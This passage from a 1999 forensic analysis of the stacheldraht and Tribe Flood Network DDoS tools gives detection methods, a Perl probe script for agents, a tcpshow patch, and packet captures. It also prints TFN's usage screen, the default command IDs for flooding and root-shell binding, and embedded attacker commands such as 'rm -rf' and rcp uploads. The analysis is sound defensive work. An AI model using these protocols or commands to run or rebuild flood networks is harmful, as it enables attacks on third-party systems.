+mserv   1088 root  mem    REG    3,3 4016683 30729 /lib/libc-2.1.1.so
+mserv   1088 root    0u   CHR  136,4             6 /dev/pts/4
+mserv   1088 root    1u   CHR  136,4             6 /dev/pts/4
+mserv   1088 root    2u   CHR  136,4             6 /dev/pts/4
+mserv   1088 root    3r  FIFO    0,0          2227 pipe
+mserv   1088 root    5w  FIFO    0,0          2227 pipe
+mserv   1091 root  cwd    DIR    3,3    2048 40961 /tmp/...
+mserv   1091 root  rtd    DIR    3,3    1024     2 /
+mserv   1091 root  txt    REG    3,3   50506 41421 /tmp/.../mserv
+mserv   1091 root  mem    REG    3,3  342206 30722 /lib/ld-2.1.1.so
+mserv   1091 root  mem    REG    3,3   63878 30731 /lib/libcrypt-2.1.1.so
+mserv   1091 root  mem    REG    3,3 4016683 30729 /lib/libc-2.1.1.so
+mserv   1091 root    0u   CHR  136,4             6 /dev/pts/4
+mserv   1091 root    1u   CHR  136,4             6 /dev/pts/4
+mserv   1091 root    2u   CHR  136,4             6 /dev/pts/4
+mserv   1091 root    3r  FIFO    0,0          2240 pipe
+mserv   1091 root    4u  inet   2215           TCP
+192.168.0.1:16660->10.0.0.1:1029 (ESTABLISHED)
+mserv   1091 root    5w  FIFO    0,0          2240 pipe
+------------------------------------------------------------------------------
+
+The agent, which also forks when in use, looks like this:
+
+------------------------------------------------------------------------------
+# lsof -c ttymon
+COMMAND PID USER   FD   TYPE DEVICE    SIZE  NODE NAME
+ttymon  437 root  cwd    DIR    3,1    1024 37208 /usr/lib/libx/...
+ttymon  437 root  rtd    DIR    3,1    1024     2 /
+ttymon  437 root  txt    REG    3,1  324436 37112 /usr/lib/libx/.../ttymon
+ttymon  437 root  mem    REG    3,1  243964 29140 /lib/libnss_files-2.1.1.so
+ttymon  437 root  mem    REG    3,1 4016683 29115 /lib/libc-2.1.1.so
+ttymon  437 root  mem    REG    3,1  342206 28976 /lib/ld-2.1.1.so
+ttymon  437 root    3u  sock    0,0           779 can't identify protocol
+ttymon  449 root  cwd    DIR    3,1    1024 37208 /usr/lib/libx/...
+ttymon  449 root  rtd    DIR    3,1    1024     2 /
+ttymon  449 root  txt    REG    3,1  324436 37112 /usr/lib/libx/.../ttymon
+ttymon  449 root    0u  inet    811           TCP *:32222 (LISTEN)
+ttymon  449 root    3u  sock    0,0           779 can't identify protocol
+------------------------------------------------------------------------------
+
+
+Defenses
+--------
+
+Because the programs use ICMP_ECHOREPLY packets for communication,
+it will be very difficult (if not impossible) to block it without
+breaking most Internet programs that rely on ICMP.  The Phrack
+paper on LOKI states:
+
+	The only sure way to destroy this channel is to deny ALL
+	ICMP_ECHO traffic into your network.
+
+Short of rejecting this traffic, it will instead be necessary to observe
+the difference between "normal" use of ICMP_ECHO and ICMP_ECHOREPLY
+packets by programs like "ping".  This will not be an easy task,
+especially on large networks.  (See the LOKI paper for more details.)
+
+The real defense is to make sure that *all* systems are kept up to
+date with security patches, unnecessary services are turned off,
+and competent system administrators are running and monitoring
+every Unix system on your network.  (I'll hold my breath while you
+go make that happen, OK? ;)
+
+
+Weaknesses
+----------
+
+If the source has not been modified, you can identify stacheldraht
+clients/handlers/agents by the embedded strings shown earlier.
+
+The .distro command uses the Berkeley "rcp" command for obtaining
+updated copies of the agent.  Monitoring "rcp" connections (514/tcp)
+from multiple systems on your network, in quick succession, to a
+single IP address outside your network would be a good trigger. (Note
+that the use of "rcp" in a this form requires an anonymous trust
+relationship, usually in the form of "+ +" in a user's ~/.rhosts file,
+which also will allow you to immediately archive the contents of this
+account while contacting the owners to preserve evidence.)
+
+The IP spoof test uses a constant source address of "3.3.3.3", and
+embeds the agent's IP address, exposing it.  Watch for this to show up
+in the source address of outgoing unsolicited ICMP_ECHOREPLY packets.
+(If you do RFC 2267 style egress filtering, you will have to watch for
+these packets from somewhere inside your border routers, or on each
+subnet. Ethernet switches will make this more difficult to do on local
+subnets, so an intrusion detection system (IDS) just inside your
+borders would be the best way to do this for your entire network.)
+
+Since stacheldraht uses ICMP_ECHOREPLY packets for some of its
+functioning, and those TCP connections that it uses employ Blowfish
+encryption of the data stream, it will be difficult to detect
+stacheldraht in action, and the ICMP_ECHOREPLY packets will go right
+through most firewalls.  You can observe these strings in the data
+portion of ICMP packets using programs like "ngrep" (see Appendix B),
+with "sniffit" using the patches provided in the analysis of TFN, or
+with "tcpshow" modified per the patches in Appendix C.
+
+Stacheldraht does not authenticate the source of ICMP packets,
+and also does not encrypt strings embedded in ICMP packets.
+
+If the command values have not been changed from the default,
+as few as just one packet would be necessary to flush out an
+agent.  Either:
+
+  a). send an ICMP_ECHOREPLY packet with an ID field value of 668 and
+      watch for an ICMP_ECHOREPLY packet to come back with an ID field
+      value of 669 and the string "sicken\n" in the data field, or
+
+  b). send an ICMP_ECHOREPLY packet with a source address of
+      "3.3.3.3" (and ID value of 666 and data field with "skillz"
+      if you want to go all out) and watch for an ICMP_ECHOREPLY
+      packet to come back with an ID field value of 1000 and the
+      string "spoofworks" in the data field.
+
+(A Perl script using Net::RawIP named "gag" has been developed to
+accomplish the former.  See Appendix A).
+
+
+The next logical evolutionary steps
+-----------------------------------
+
+When I first started analyzing trinoo source code back in early
+October, and after having observed TFN binaries in action just after
+that, it was obvious to me that encryption of communication channels
+and more automated maintenance of large networks was in active
+development.  Discussions with others at the CERT workshop in November
+brought out many other new feature ideas that I'm sure the underground
+is also thinking of.
+
+Having now seen the stacheldraht code, and that of yet another
+unreleased distributed denial of service attack tool (for a total of
+four different handler/agent distributed DoS tools found "in the
+wild" this year), the assumptions about the evolution of these tools
+appear to have been correct, even if the code remains a bit unfinished
+and with a few bugs (e.g., installations witnessed as late as December
+20 continue to include cron entries that re-start the agent every
+minute!)
+
+I can't wait to see what the New Year will bring. ;) :(  ??  @#$%^&*!!!
+
+--
+David Dittrich &lt;dittrich@cac.washington.edu>
+http://staff.washington.edu/dittrich/
+
+
+
+Appendix A - Perl script "gag" to detect stacheldraht agents
+------------------------------------------------------------
+
+-------------------------------  cut here  -----------------------------------
+#!/usr/bin/perl
+#
+# gag v. 1.0
+# By Dave Dittrich &lt;dittrich@cac.washington.edu>
+# 
+# Send an ICMP_ECHOREPLY packet with ID of 668 to a stacheldraht
+# agent, causing it to reply to the sending host with an
+# ICMP_ECHOREPLY packet with an ID of 669 and the string "sicken\n"
+# in the data field of the packet.  Watch for this with tcpdump,
+# ngrep, sniffit, etc., e.g.:
+#
+#	# tcpdump -s 1500 -w stach.dump 'icmp[4:2] = 669'
+#	# tcpshow &lt; stach.dump
+#  or
+#       # ngrep -x '*' 'icmp[4:2] = 669'
+#
+# Needs Net::RawIP (http://quake.skif.net/RawIP)
+# Requires libpcap (ftp://ftp.ee.lbl.gov/libpcap.tar.Z)
+#
+# Example: ./gag [options] iplist
+#
+# (This code was hacked from the "macof" program, written by
+# Ian Vitek &lt;ian.vitek@infosec.se>)
+
+require 'getopts.pl';
+use Net::RawIP;
+require 'netinet/in.ph';
+
+$a = new Net::RawIP({icmp => {}});
+chop($hostname = `hostname`);
+
+Getopts('a:c:f:i:vh');
+die "usage: $0 [options] iplist\
+\t-a arg\t\tSend command argument 'arg' (default \"gesundheit!\")\
+\t-c val\t\tSend command value 'val' (default 668 - ID_TEST)\
+\t-f from_host\t\t(default:$hostname)\
+\t-i interface \t\tSet sending interface (default:eth0)\
+\t-v\t\t\tVerbose\
+\t-h This help\n" unless ( !$opt_h );
+
+# set default values
+$opt_i = ($opt_i) ? $opt_i : "eth0";
+$opt_a = ($opt_a) ? $opt_a : "gesundheit!";
+$opt_c = ($opt_c) ? $opt_c : "668";
+
+# choose network card
+if($opt_e) {
+  $a->ethnew($opt_i, dest => $opt_e);
+} else {
+  $a->ethnew($opt_i);
+}
+
+$s_host = ($opt_f) ? $opt_f : $hostname;
+
+if ($ARGV[0]) {
+  open(I,"&lt;$ARGV[0]") || die "could not open file: '$ARGV[0]'";
+  while (&lt;I>) {
+    chop;
+    push(@list,$_);
+  }
+  close(I);
+}
+
+# Put value in network byte order (couldn't get htons() in
+# "netinet/in.ph" to work. Go figure.)
+$id = unpack("S", pack("n", $opt_c));
+
+foreach $d_host (@list) {
+  $a->set({ip => {saddr => $s_host, daddr => $d_host},
+           icmp => {type => 0, id => $id, data => $opt_a}
+          });
+  print "sending packet [$opt_c/\"$opt_a\"] to $d_host\n" if $opt_v;
+  $a->send;
+}
+
+exit(0);
+-------------------------------  cut here  -----------------------------------
+
+
+Appendix B - References
+-----------------------
+
+TCP/IP Illustrated, Vol. I, II, and III. W. Richard Stevens and Gary
+R. Wright., Addison-Wesley.
+
+The DoS Project's "trinoo" distributed denial of service attack tool
+	http://staff.washington.edu/dittrich/misc/trinoo.analysis
+
+The "Tribe Flood Network" distributed denial of service attack tool
+	http://staff.washington.edu/dittrich/misc/tfn.analysis
+
+CERT Distributed System Intruder Tools Workshop report
+	http://www.cert.org/reports/dsit_workshop.pdf
+
+CERT Advisory CA-99-17 Denial-of-Service Tools
+	http://www.cert.org/advisories/CA-99-17-denial-of-service-tools.html
+
+Distributed denial of service attack tools at Packet Storm Security
+	http://packetstorm.securify.com/distributed/
+
+ngrep:
+	http://www.packetfactory.net/ngrep/
+
+tcpdump:
+	ftp://ftp.ee.lbl.gov/tcpdump.tar.Z
+
+tcpshow:
+	http://packetstorm.securify.com/linux/trinux/src/tcpshow.c
+
+sniffit:
+	http://sniffit.rug.ac.be/sniffit/sniffit.html
+
+Net::RawIP:
+	http://quake.skif.net/RawIP
+
+loki client/server:
+	Phrack Magazine, Volume Seven, Issue Forty-Nine,
+	File 06 of 16, [ Project Loki ]
+	http://www.phrack.com/search.phtml?view&article=p49-6
+
+	Phrack Magazine  Volume 7, Issue 51 September 01, 1997,
+	article 06 of 17 [ L O K I 2   (the implementation) ]
+	http://www.phrack.com/search.phtml?view&article=p51-6
+
+libnet:
+	http://www.packetfactory.net/libnet
+----------------------------------------------------------------------------
+
+
+Appendix C: Patches to tcpshow 1.0 to display ICMP ECHO id/seq
+----------------------------------------------------------------------
+diff -c tcpshow/tcpshow.c tcpshow.orig/tcpshow.c
+*** tcpshow/tcpshow.c	Mon Dec 27 16:21:54 1999
+--- tcpshow.orig/tcpshow.c	Thu Oct 21 14:12:19 1999
+***************
+*** 1081,1088 ****
+     uint2 nskipped;
+     uint1 type;
+     char *why;
+-    uint2 echo_id;
+-    uint2 echo_seq;
+  
+  
+     type = getbyte(&pkt);  nskipped  = sizeof(type);
+--- 1081,1086 ----
+***************
+*** 1093,1103 ****
+     /* Must calculate it from the size of the IP datagram - the IP header.   */
+     datalen -= ICMPHDRLEN;
+  
+-    if (type == ECHO_REQ || type == ECHO_REPLY) {
+-       echo_id = getword(&pkt); nskipped += sizeof(cksum);
+-       echo_seq = getword(&pkt); nskipped += sizeof(cksum);
+-    }
+- 
+     why = icmpcode(type, code);
+     if (dataflag) {
+        printf(
+--- 1091,1096 ----
+***************
+*** 1120,1129 ****
+  	 icmptype(type), why? "\n\tBecause:\t\t\t": "", why? why: ""
+        );
+        printf("\tChecksum:\t\t\t0x%04X\n", cksum);
+-       if (type == ECHO_REQ || type == ECHO_REPLY) {
+-          printf("\tId:\t\t\t\t0x%04X (%d)\n", echo_id, echo_id);
+-          printf("\tSequence:\t\t\t0x%04X (%d)\n", ntohs(echo_seq), ntohs(echo_seq));
+-       }
+     }
+  
+     return pkt;
+--- 1113,1118 ----
+***************
+*** 1194,1200 ****
+        printf("\tVersion:\t\t\t4\n\tHeader Length:\t\t\t%d bytes\n", hlen);
+        printf("\tService Type:\t\t\t0x%02X\n", (uint2)servtype);
+        printf("\tDatagram Length:\t\t%d bytes\n", dgramlen);
+!       printf("\tIdentification:\t\t\t0x%04X (%d)\n", id, id);
+        printf(
+  	 "\tFlags:\t\t\t\tMF=%s DF=%s\n",
+  	 (flags & MF) == MF? on: off, (flags & DF) == DF? on_e: off_e
+--- 1183,1189 ----
+        printf("\tVersion:\t\t\t4\n\tHeader Length:\t\t\t%d bytes\n", hlen);
+        printf("\tService Type:\t\t\t0x%02X\n", (uint2)servtype);
+        printf("\tDatagram Length:\t\t%d bytes\n", dgramlen);
+!       printf("\tIdentification:\t\t\t0x%04X\n", id);
+        printf(
+  	 "\tFlags:\t\t\t\tMF=%s DF=%s\n",
+  	 (flags & MF) == MF? on: off, (flags & DF) == DF? on_e: off_e
+----------------------------------------------------------------------
+     
+
+<a name="tribeflood"></a><hr><pre>
+==========================================================================
+
+  The "Tribe Flood Network" distributed denial of service attack tool
+
+==========================================================================
+
+David Dittrich &lt;dittrich@cac.washington.edu>
+University of Washington
+Copyright 1999. All rights reserved.
+October 21, 1999
+
+
+Introduction
+------------
+
+The following is an analysis of the "Tribe Flood Network", or "TFN",
+by Mixter. TFN is currently being developed and tested on a large
+number of compromised Unix systems on the Internet, along with another
+distributed denial of service tool named "trinoo" (see separate paper
+analyzing trinoo.)
+
+TFN is made up of client and daemon programs, which implement a
+distributed network denial of service tool capable of waging ICMP
+flood, SYN flood, UDP flood, and Smurf style attacks, as well as
+providing an "on demand" root shell bound to a TCP port.
+
+TFN daemons were originally found in binary form on a number of
+Solaris 2.x systems, which were identified as having been compromised
+by exploitation of buffer overrun bugs in the RPC services "statd",
+"cmsd" and "ttdbserverd".  These attacks are described in CERT
+Incident Note 99-04:
+
+	http://www.cert.org/incident_notes/IN-99-04.html
+
+These daemons were originally believed to be some form of remote
+sniffer or access-controlled remote command shells, possibly used in
+conjunction with sniffers to automate recovering sniffer logs.
+
+During investigation of a related set of intrusions and denial of
+service attacks using trinoo networks (another distributed denial of
+service attack tool described in another paper), the installation of a
+trinoo network was caught in the act and the trinoo and TFN source
+code was obtained from the stolen account used to cache the intruders'
+tools and log files.  This analysis was done using this captured
+source code ("version 1.3 build 0053", according to the Makefile) and
+from observations of newer compiled binaries of the TFN daemon.
+
+Modification of the source code can and would change any of the
+details of this analysis, such as prompts, passwords, commands,
+TCP/UDP port numbers, or supported attack methods, signatures, and
+features.
+
+Both the daemon and client were compiled and run on Red Hat Linux 6.0
+systems.  It is believed that daemon has been witnessed "in the wild"
+only on Solaris 2.x systems.
+
+For an analysis of the initial intrusion and network setup phases,
+see the analysis of the trinoo network.
+
+
+The network: attacker(s)-->client(s)-->daemon(s)-->victim(s)
+------------------------------------------------------------
+
+The TFN network is made up of a tribe client program ("tribe.c") and the
+tribe daemon ("td.c").  A TFN network would look like this:
+
+
+                  +----------+           +----------+
+                  | attacker |           | attacker |
+                  +----------+           +----------+
+                       |                      |
+        . . . --+------+---------------+------+----------------+-- . . .
+                |                      |                       |
+                |                      |                       |
+           +----------+           +----------+            +----------+
+           |  client  |           |  client  |            |  client  |
+           +----------+           +----------+            +----------+
+                |                      |                       |
+                |                      |                       |
+. . . ---+------+-----+------------+---+--------+------------+-+-- . . .
+         |            |            |            |            |
+         |            |            |            |            |
+     +--------+   +--------+   +--------+   +--------+   +--------+
+     | daemon |   | daemon |   | daemon |   | daemon |   | daemon |
+     +--------+   +--------+   +--------+   +--------+   +--------+
+
+
+The attacker(s) control one or more clients, each of which can control
+many daemons. The daemons are all instructed to coordinate a packet
+based attack against one or more victim systems by the client.
+
+
+Communication
+-------------
+
+Remote control of a TFN network is accomplished via command line
+execution of the client program, which can be accomplished using any
+of a number of connection methods (e.g., remote shell bound to a TCP
+port, UDP based client/server remote shells, ICMP based client/server
+shells such as LOKI, SSH terminal sessions, or normal "telnet" TCP
+terminal sessions.)
+
+No password is required to run the client, although it is necessary to
+have the list of daemons at hand in an "iplist" file.
+
+Communication from the TFN client to daemons is accomplished via
+ICMP_ECHOREPLY packets.  There is no TCP or UDP based communication
+between the client and daemons at all.  (Some network monitoring tools
+do not show the data portion of ICMP packets, or do not parse all of
+the various ICMP type-specific fields, so it may be difficult to
+actually monitor the communication between client and daemon.  See
+Appendix A for patches to Sniffit version 0.3.7.beta to allow it to
+display ICMP data segments, and Appendix B for patches to tcpshow.c
+1.0 to display ICMP_ECHO and ICMP_ECHOREPLY id and sequence numbers.)
+
+Running the program without specifying any options or arguments gets
+you a help screen, which shows the commands supported by TFN:
+
+---------------------------------------------------------------------------
+		[tribe flood network]	 (c) 1999 by Mixter
+
+usage: ./tfn &lt;iplist> &lt;type> [ip] [port]
+&lt;iplist>     contains a list of numerical hosts that are ready to flood
+&lt;type>       -1 for spoofmask type (specify 0-3), -2 for packet size,
+             is 0 for stop/status, 1 for udp, 2 for syn, 3 for icmp,
+             4 to bind a rootshell (specify port)
+             5 to smurf, first ip is target, further ips are broadcasts
+[ip]         target ip[s], separated by @ if more than one
+[port]       must be given for a syn flood, 0 = RANDOM
+---------------------------------------------------------------------------
+
+
+Password protection
+-------------------
+
+While the client is not password protected, per se, each "command" to
+the daemons is sent in the form of a 16 bit binary number in the id
+field of an ICMP_ECHOREPLY packet.  (The sequence number is a constant
+0x0000, which would make it look like the response to the initial
+packet sent out by the "ping" command.)
+
+The values of these numbers, as well as macros that change the name
+of the running process as seen by PS(1), are defined by the file
+"config.h":
+
+---------------------------------------------------------------------------
+#ifndef _CONFIG_H
+
+/* user defined values for the teletubby flood network */
+
+#define HIDEME "tfn-daemon"
+#define HIDEKIDS "tfn-child"
+#define CHLD_MAX 50
+
+/* #define ATTACKLOG "attack.log" keep a log of attacks/victims on all
+   hosts running td for debugging etc. (hint: bad idea) */
+
+/* These are like passwords, you might want to change them */
+
+#define ID_ACK		123	/* for replies to the client */
+#define ID_SHELL	456	/* to bind a rootshell, optional */
+#define ID_PSIZE	789	/* to change size of udp/icmp packets */
+#define ID_SWITCH	234	/* to switch spoofing mode */
+#define ID_STOPIT	567	/* to stop flooding */
+#define ID_SENDUDP	890	/* to udp flood */
+#define ID_SENDSYN	345	/* to syn flood */
+#define ID_SYNPORT	678	/* to set port */
+#define ID_ICMP		901	/* to icmp flood */
+#define ID_SMURF	666	/* haps! haps! */
+
+#define _CONFIG_H
+#endif
+---------------------------------------------------------------------------
+
+As you can see, it is recommended that these be changed to prevent
+someone stumbling across the daemons from knowing what values are
+used, thereby allowing them to execute daemon commands.
+
+
+Fingerprints
+------------
+
+As with trinoo, the method used to install the client/daemon will be
+the same as installing any program on a Unix system, with all the
+standard options for concealing the programs and files.
+
+Both the client and the daemon must be run as root, as they both open
+a AF_INET socket in SOCK_RAW mode.
+
+The client program requires the iplist be available, so finding a
+client will allow you to get the list of clients.  Recent
+installations of TFN daemons have included strings that indicate
+the author is (or has) added Blowfish encryption of the iplist file.
+This will make the task of determining the daemons much harder.
+
+Strings embedded in a recently recovered TFN daemon binary (edited
+and rearranged for clarity, with comments to the right) are:
+
+------------------------------------------------------------------------------
+blowfish_init
+blowfish_encipher
+blowfish_decipher		Uses Blowfish for encryption of something.
+encrypt_string
+decrypt_string
+
+serverworks
+readmservers
+addnewmserver			Has more advanced client/server functions.
+delmserver
+servcounti
+
+icmp2
+udppsize
+icmpsize
+spoofing
+spooftest
+commence_icmp			Attack function signatures.
+commence_udp
+commence_syn
+floodtime
+floodruns
+
+bind
+setsockopt			Remote shell function.
+listensocket
+
+k00lip
+fw00ding
+k00lntoa
+tc: unknown host
+rm -rf %s
+ttymon
+rcp %s@%s:sol.bin %s		Embedded commands to upload files,
+nohup ./%s			delete files, and with an association
+130.243.70.20			with a particular IP address
+127.0.0.1			(possibly a client, or location of a
+lpsched				file cache)
+sicken
+in.telne
+------------------------------------------------------------------------------
+
+If "lsof" is used to examine the running daemon process, it only shows
+an open socket of unspecified protocol:
+
+------------------------------------------------------------------------------
+td        5931     root  cwd    DIR        3,5    1024    240721
+/usr/lib/libx/...
+td        5931     root  rtd    DIR        3,1    1024         2 /
+td        5931     root  txt    REG        3,5  297508    240734
+/usr/lib/libx/.../td
+td        5931     root    3u  sock        0,0             92814 can't
+identify protocol
+------------------------------------------------------------------------------
+
+If a remote shell has been started, the daemon will fork and show a
+new process with a listening TCP port:
+
+------------------------------------------------------------------------------
+td        5970     root  cwd    DIR        3,5    1024    240721
+/usr/lib/libx/...
+td        5970     root  rtd    DIR        3,1    1024         2 /
+td        5970     root  txt    REG        3,5  297508    240734
+/usr/lib/libx/.../td (deleted)
+td        5970     root    0u  inet      92909               TCP
+*:12345 (LISTEN)
+td        5970     root    3u  sock        0,0             92814 can't
+identify protocol
+------------------------------------------------------------------------------
+
+Monitoring the network traffic using "sniffit" (modified per Appendix
+A), and doing "ping -c 3 10.0.0.1" (sends three ICMP_ECHO packets,
+wait for ICMP_ECHOREPLY packets in return, and quit) looks like this
+(IP header removed for clarity):
+
+---------------------------------------------------------------------------
+# sniffit -d -a -x -b -s @ -Picmp
+Supported Network device found. (eth0)
+Sniffit.0.3.7 Beta is up and running.... (192.168.0.1)
+
+ICMP message id: 192.168.0.1 > 10.0.0.1
+  ICMP type: Echo request
+ .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. .
+ .. . .. . .. . .. . 08 . 00 . 2B + 51 Q 98 . 04 . 00 . 00 . 37 7 FC . 0D . 38 8
+ 02 . 73 s 02 . 00 . 08 . 09 . 0A . 0B . 0C . 0D . 0E . 0F . 10 . 11 . 12 . 13 .
+ 14 . 15 . 16 . 17 . 18 . 19 . 1A . 1B . 1C . 1D . 1E . 1F . 20   21 ! 22 " 23 #
+ 24 $ 25 % 26 & 27 ' 28 ( 29 ) 2A * 2B + 2C , 2D - 2E . 2F / 30 0 31 1 32 2 33 3
+ 34 4 35 5 36 6 37 7
+
+ICMP message id: 10.0.0.1 > 192.168.0.1
+  ICMP type: Echo reply
+ .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. .
+ .. . .. . .. . .. . 00 . 00 . 33 3 51 Q 98 . 04 . 00 . 00 . 37 7 FC . 0D . 38 8
+ 02 . 73 s 02 . 00 . 08 . 09 . 0A . 0B . 0C . 0D . 0E . 0F . 10 . 11 . 12 . 13 .
+ 14 . 15 . 16 . 17 . 18 . 19 . 1A . 1B . 1C . 1D . 1E . 1F . 20   21 ! 22 " 23 #
+ 24 $ 25 % 26 & 27 ' 28 ( 29 ) 2A * 2B + 2C , 2D - 2E . 2F / 30 0 31 1 32 2 33 3
+ 34 4 35 5 36 6 37 7
+
+ICMP message id: 192.168.0.1 > 10.0.0.1
+  ICMP type: Echo request
+ .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. .
+ .. . .. . .. . .. . 08 . 00 . 58 X 61 a 98 . 04 . 01 . 00 . 38 8 FC . 0D . 38 8
+ D3 . 62 b 02 . 00 . 08 . 09 . 0A . 0B . 0C . 0D . 0E . 0F . 10 . 11 . 12 . 13 .
+ 14 . 15 . 16 . 17 . 18 . 19 . 1A . 1B . 1C . 1D . 1E . 1F . 20   21 ! 22 " 23 #
+ 24 $ 25 % 26 & 27 ' 28 ( 29 ) 2A * 2B + 2C , 2D - 2E . 2F / 30 0 31 1 32 2 33 3
+ 34 4 35 5 36 6 37 7
+
+ICMP message id: 10.0.0.1 > 192.168.0.1
+  ICMP type: Echo reply
+ .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. .
+ .. . .. . .. . .. . 00 . 00 . 60 ` 61 a 98 . 04 . 01 . 00 . 38 8 FC . 0D . 38 8
+ D3 . 62 b 02 . 00 . 08 . 09 . 0A . 0B . 0C . 0D . 0E . 0F . 10 . 11 . 12 . 13 .
+ 14 . 15 . 16 . 17 . 18 . 19 . 1A . 1B . 1C . 1D . 1E . 1F . 20   21 ! 22 " 23 #
+ 24 $ 25 % 26 & 27 ' 28 ( 29 ) 2A * 2B + 2C , 2D - 2E . 2F / 30 0 31 1 32 2 33 3
+ 34 4 35 5 36 6 37 7
+
+ICMP message id: 192.168.0.1 > 10.0.0.1
+  ICMP type: Echo request
+ .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. .
+ .. . .. . .. . .. . 08 . 00 . 70 p 61 a 98 . 04 . 02 . 00 . 39 9 FC . 0D . 38 8
+ B9 . 62 b 02 . 00 . 08 . 09 . 0A . 0B . 0C . 0D . 0E . 0F . 10 . 11 . 12 . 13 .
+ 14 . 15 . 16 . 17 . 18 . 19 . 1A . 1B . 1C . 1D . 1E . 1F . 20   21 ! 22 " 23 #
+ 24 $ 25 % 26 & 27 ' 28 ( 29 ) 2A * 2B + 2C , 2D - 2E . 2F / 30 0 31 1 32 2 33 3
+ 34 4 35 5 36 6 37 7
+
+ICMP message id: 10.0.0.1 > 192.168.0.1
+  ICMP type: Echo reply
+ .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. .
+ .. . .. . .. . .. . 00 . 00 . 78 x 61 a 98 . 04 . 02 . 00 . 39 9 FC . 0D . 38 8
+ B9 . 62 b 02 . 00 . 08 . 09 . 0A . 0B . 0C . 0D . 0E . 0F . 10 . 11 . 12 . 13 .
+ 14 . 15 . 16 . 17 . 18 . 19 . 1A . 1B . 1C . 1D . 1E . 1F . 20   21 ! 22 " 23 #
+ 24 $ 25 % 26 & 27 ' 28 ( 29 ) 2A * 2B + 2C , 2D - 2E . 2F / 30 0 31 1 32 2 33 3
+ 34 4 35 5 36 6 37 7
+----------------------------------------------------------------------------
+
+As you can see, packets with a fixed payload (bytes 17 on) are sent as
+ICMP_ECHO packets to the destination, which returns the same payload as
+an ICMP_ECHOREPLY packet.  The initial packet has a sequence number of
+zero (seen as bytes 7 and 8 in the ICMP packet), which is incremented
+for each further packet sent in sequence.
+
+Seen by tcpdump/tcpshow (modified per Appendix B), the three packet
+"ping" flow would look like:
+
+----------------------------------------------------------------------------
+# tcpdump -lenx -s 1518 icmp | tcpshow -noip -nolink -cooked
+tcpdump: listening on eth0
+Packet 1
+ICMP Header
+	Type:				echo-request
+	Checksum:			0x9B2A
+	Id:				0x6E03
+	Sequence:			0x0000
+ICMP Data
+	q..8x.
+	..	
+	..................... !"#$%&'()*+,-./01234567
+-----------------------------------------------------------------
+Packet 2
+ICMP Header
+	Type:				echo-reply
+	Checksum:			0xA32A
+	Id:				0x6E03
+	Sequence:			0x0000
+ICMP Data
+	q..8x.
+	..	
+	..................... !"#$%&'()*+,-./01234567
+-----------------------------------------------------------------
+Packet 3
+ICMP Header
+	Type:				echo-request
+	Checksum:			0x623A
+	Id:				0x6E03
+	Sequence:			0x0001
+ICMP Data
+	r..8..
+	..	
+	..................... !"#$%&'()*+,-./01234567
+-----------------------------------------------------------------
+Packet 4
+ICMP Header
+	Type:				echo-reply
+	Checksum:			0x6A3A
+	Id:				0x6E03
+	Sequence:			0x0001
+ICMP Data
+	r..8..
+	..	
+	..................... !"#$%&'()*+,-./01234567
+-----------------------------------------------------------------
+Packet 5
+ICMP Header
+	Type:				echo-request
+	Checksum:			0x5A3A
+	Id:				0x6E03
+	Sequence:			0x0002
+ICMP Data
+	s..8..
+	..	
+	..................... !"#$%&'()*+,-./01234567
+-----------------------------------------------------------------
+Packet 6
+ICMP Header
+	Type:				echo-reply
+	Checksum:			0x623A
+	Id:				0x6E03
+	Sequence:			0x0002
+ICMP Data
+	s..8..
+	..	
+	..................... !"#$%&'()*+,-./01234567
+-----------------------------------------------------------------
+
+The TFN client, on the other hand, sends commands to daemons using
+ICMP_ECHOREPLY packets instead of ICMP_ECHO.  This is to prevent the
+kernel on the daemon system from replying with an ICMP_ECHOREPLY packet.
+The daemon then responds (if need be) to the client(s), also using an
+ICMP_ECHOREPLY packet.  The payload differs with TFN, as it is used
+for sending command arguments and replies.
+
+The ICMP_ECHOREPLY id field contains the "command" (16 bit value,
+converted to network byte order with htons() in the code) and any
+arguments in ASCII clear text form in the data field of the packet.
+
+Here is what an attacker sees when executing the command to start a
+shell listening on port 12345:
+
+----------------------------------------------------------------------------
+# ./tfn iplist 4 12345
+		[tribe flood network]	 (c) 1999 by Mixter
+
+[request: bind shell to port 12345]
+192.168.0.1: shell bound to port 12345
+#
+----------------------------------------------------------------------------
+
+Here is the packet flow for this command as seen on the network with
+"sniffit" (IP headers removed for clarity):
+
+----------------------------------------------------------------------------
+ICMP message id: 10.0.0.1 > 192.168.0.1
+  ICMP type: Echo reply
+ .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. .
+ .. . .. . .. . .. . 00 . 00 . 64 d D1 . 01 . C8 . 00 . 00 . 31 1 32 2 33 3 34 4
+ 35 5 00 .
+
+ICMP message id: 192.168.0.1 > 10.0.0.1
+  ICMP type: Echo reply
+ .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. .
+ .. . .. . .. . .. . 00 . 00 . 6C l AE . 00 . 7B { 00 . 00 . 73 s 68 h 65 e 6C l
+ 6C l 20   62 b 6F o 75 u 6E n 64 d 20   74 t 6F o 20   70 p 6F o 72 r 74 t 20  
+ 31 1 32 2 33 3 34 4 35 5 0A . 00 .
+----------------------------------------------------------------------------
+
+Viewed with tcpdump alone, it would look like this (IP headers
+removed for clarity):
+
+----------------------------------------------------------------------------
+# tcpdump -lnx -s 1518 icmp
+tcpdump: listening on eth0
+05:51:32.706829 10.0.0.1 > 192.168.0.1: icmp: echo reply
+			 .... .... .... .... .... .... .... ....
+			 .... .... 0000 64d1 01c8 0000 3132 3334
+			 3500
+05:51:32.741556 192.168.0.1 > 10.0.0.1: icmp: echo reply
+			 .... .... .... .... .... .... .... ....
+			 .... .... 0000 6cae 007b 0000 7368 656c
+			 6c20 626f 756e 6420 746f 2070 6f72 7420
+			 3132 3334 350a 00
+----------------------------------------------------------------------------
+
+Combining tcpdump with tcpshow, it is easier to see the data payload:
+
+----------------------------------------------------------------------------
+Packet 1
+ICMP Header
+	Type:				echo-reply
+	Checksum:			0x64D1
+	Id:				0x01C8
+	Sequence:			0x0000
+ICMP Data
